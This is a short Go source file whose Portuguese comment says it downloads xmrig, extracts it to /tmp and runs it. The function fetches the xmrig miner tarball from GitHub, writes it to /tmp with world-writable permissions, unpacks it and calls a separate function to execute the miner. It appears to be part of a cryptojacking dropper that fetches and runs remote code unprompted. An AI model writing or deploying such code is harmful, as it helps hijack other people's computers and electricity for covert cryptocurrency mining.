package main

import (
	"io/ioutil"
	"net/http"
	"os/exec"
)

//essa funcao abaixara o  xmrig  e extraira seus bytes  para /tmp e executara ele

func raw_xmrig() {

	cli := http.Client{}

	resp, err_get := cli.Get("https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz")

	if err_get == nil {

		xmrig_bytes, err_readall := ioutil.ReadAll(resp.Body)

		if err_readall == nil {

			ioutil.WriteFile("/tmp/xmr.tar.gz", xmrig_bytes, 0777)

			xmr_decode := exec.Command("tar", "-xf", "/tmp/xmr.tar.gz", "-C", "/tmp")

			xmr_decode.Run()

			exec_xmrig()

		}

	}

}
